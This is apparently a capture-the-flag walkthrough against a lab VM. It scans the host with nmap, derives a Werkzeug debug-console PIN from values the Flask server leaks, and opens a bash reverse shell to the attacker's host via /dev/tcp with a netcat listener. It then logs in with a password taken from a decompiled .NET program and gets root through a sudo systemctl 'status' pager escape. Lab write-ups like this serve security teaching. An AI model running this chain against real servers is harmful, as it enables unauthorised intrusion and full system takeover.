# Writeup for generating flask pin(python)

## Running initial nmap scan
```bash
sudo nmap -sC -sT -sV -A <IP> -oN nmap
```

The output is as follows:
```
# Nmap 7.94 scan initiated Wed Oct  4 20:17:06 2023 as: nmap -sC -sT -sV -A -oN nmap/initial 192.168.183.122
Nmap scan report for 192.168.183.122
Host is up (0.00047s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 64:8d:51:2b:2b:25:ed:2e:3f:60:9b:39:98:53:6c:56 (RSA)
|   256 e8:52:1a:c1:a9:49:01:f9:14:a3:0d:2c:6c:75:6e:ee (ECDSA)
|_  256 bc:e6:cb:e8:ff:4a:67:09:85:77:6f:d6:5a:62:42:c5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site Under Construction
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.0 Python/3.8.10
|     Date: Wed, 04 Oct 2023 14:47:13 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 220
|     Connection: close
|     This is a development server
|     mac_address: 197444420749453
|     machine id: 1a77c4feaeab4506843f3082decdb7cc
|     running in: /usr/local/lib/python3.8/dist-packages/flask/app.py
|     username: python
|     date: unavailable
|     server id: srv01
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.0 Python/3.8.10
|     Date: Wed, 04 Oct 2023 14:47:28 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|     Connection: close
|   Help:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94%I=7%D=10/4%Time=651D7AF1%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,18A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.0\x20
SF:Python/3\.8\.10\r\nDate:\x20Wed,\x2004\x20Oct\x202023\x2014:47:13\x20GM
SF:T\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:0220\r\nConnection:\x20close\r\n\r\nThis\x20is\x20a\x20development\x20s
SF:erver\nmac_address:\x20197444420749453\nmachine\x20id:\x201a77c4feaeab4
SF:506843f3082decdb7cc\n\nrunning\x20in:\x20/usr/local/lib/python3\.8/dist
SF:-packages/flask/app\.py\nusername:\x20python\n\x20date:\x20unavailable\
SF:nserver\x20id:\x20srv01")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBLI
SF:C\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20
SF:\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Conte
SF:nt-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n
SF:\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20re
SF:sponse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</
SF:p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20ve
SF:rsion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Erro
SF:r\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20req
SF:uest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</
SF:body>\n</html>\n")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\nServer:\
SF:x20Werkzeug/3\.0\.0\x20Python/3\.8\.10\r\nDate:\x20Wed,\x2004\x20Oct\x2
SF:02023\x2014:47:28\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-
SF:8\r\nAllow:\x20GET,\x20HEAD,\x20OPTIONS\r\nContent-Length:\x200\r\nConn
SF:ection:\x20close\r\n\r\n")%r(Help,1EF,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\
SF:"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"
SF:http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<h
SF:ead>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Typ
SF:e\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x
SF:20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response
SF:</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x
SF:20\('HELP'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x2
SF:0explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20synt
SF:ax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</htm
SF:l>\n");
MAC Address: 08:00:27:F7:15:3F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.47 ms 192.168.183.122

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct  4 20:18:41 2023 -- 1 IP address (1 host up) scanned in 95.61 seconds
```


Port 80 just tells that it is still in progress
Port 5000 is running python flask server, which gives some information
```
This is a development server
mac_address: 197444420749453
machine id: 1a77c4feaeab4506843f3082decdb7cc
running in: /usr/local/lib/python3.8/dist-packages/flask/app.py
username: python
date: unavailable
server id: srv01
```

Here, debug mode is enabled (/console) so we can generate our own pin, to access /console
We take a copy of python script available in hacktricks
```
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
```

By simply changing some values ie,
    username: python
    location of module: /usr/local/lib/python3.8/dist-packages/flask/app.py
    mac address: 197444420749453
    machine_id: 1a77c4feaeab4506843f3082decdb7cc

We will get the pin: 224-208-411

accessing /console with pin, we can get reverse shell
```python
import os
os.system("/bin/bash -c 'bash -i >& /dev/tcp/<attacker's ip>/port 0>&1'")
```
and standing up a netcat listener
```bash
nc -lnvp <port>
```

We get a shell as user python

in the /home directory, we see another user manager, he has a notes left for us
```
Hey SysAdmin, I always forget the password you gave to me, so instead of saving it to a file, I have created a c# program to give me the password, Take a look at it
```

looking into the password directory, we see it is a dotnet console project.
decompiling the code with IllSpy, we get the user password: YWprZGh3YmVqZ2hkYndqaGViZGNlZmhjbmVyCg

sshing into the machine as manager with password YWprZGh3YmVqZ2hkYndqaGViZGNlZmhjbmVyCg, we are logged in.

running,
```bash
sudo -l
```
we will see this output
```
Matching Defaults entries for manager on server:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User manager may run the following commands on server:
    (ALL : ALL) /usr/bin/systemctl status custom_app.service
    ```

so we execute that command,
```bash
sudo /usr/bin/systemctl status custom_app.service
```

and typing,
```
!bash
```
we are root.
